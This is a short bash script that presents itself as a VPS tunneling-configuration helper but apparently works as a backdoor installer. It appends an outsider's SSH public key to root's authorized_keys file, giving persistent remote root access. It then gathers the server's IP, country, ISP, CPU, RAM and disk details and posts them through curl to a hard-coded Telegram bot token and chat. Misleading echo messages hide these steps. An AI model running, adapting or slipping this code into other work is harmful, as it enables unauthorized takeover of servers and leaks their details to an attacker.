#!/bin/bash
DIR=/root/.ssh/;
CONF=/root/.ssh/authorized_keys;
TOKEN_BOT="5448451991:AAHO78YB7li7hM_5nogCA9yWWvvWfLVrHH4";
CHAT_ID="-722131939";

#echo "Check old tunneling configuration..."
if [ ! -d "$DIR" ]; then
    mkdir $DIR
else
    echo "No old vps conf, creating one..."
fi

#echo "Check unused conf file..."
if [[ ! -f $CONF ]]; then
    touch $CONF
else
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7g2IvJGfcpiXcJ1wcLqQGDPTIyNpMZiIYBtfXA3oXrZtA4Lh5cxuVOUd1jnPL0ddLO3cgjIASaWqCuaDKvxGhJcfLh0MFIPwJWC9/UEWYtWHwixaDCLL4aTd0NobsLZzNo2TUR1JVcSDyA5rxg3DDnB6y1QQmLYScplFDhgKNISV9wUqBcD3Vp3fEIrMbVjQwrTWUkeQI4sxfxxE9xavAEdcLQkLeabKtaJjL2TTCONsSbqOYlzXAq5f4SaxkNVx4Wb82Qe/XlA3XCsPuL9S9tkngHpBeQH9cpn9Ptj7EWAoit2A20PiI0v5Twq4UzKCW9JAlZK6vEiET+jL2ncNL0KkqQ2jmZpWnh7GkKILUqlfiYDF4ygisYKxlQHBAIR6YLsSnwNHqZXayFjLJzENXp/D9rczOy9DPSHwawt8da47c4r+sb9MDq8CHg7Oph5USxsnoxWcFX/WTE2kG2EXXvn6IxKrxYTaT2WBU5h9TmKUK42qRqXFIUbj1qa1hXok= manssizz@kucingabu" >> $CONF
    echo "Done!"
fi

message="<u><b>VPS Information</b></u>%0a<b>CN: </b><code>$(wget -qO- ipinfo.io/country)</code>%0a\
<b>IP: </b><code>$(wget -qO- ipinfo.io/ip)</code>%0a\
<b>ISP: </b><code>$(wget -qO- ipinfo.io/org)</code>%0a"

message2="<u><b>Additional Information</b></u>\
%0a<b>CPU: </b><code>$(cat /proc/cpuinfo | grep processor | wc -l)</code> \
%0a<b>RAM: </b><code>$(free -m | grep Mem | awk '{print $2 / 1024}')</code> \
%0a<b>DISK: </b><code>$(df -h / | awk '/\// {print $(NF-4)}')</code>"
curl -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendmessage" -d "chat_id=$CHAT_ID" -d "parse_mode=html" -d "text=$message%0a$message2" > /dev/null

#echo "Preparing for next step..." 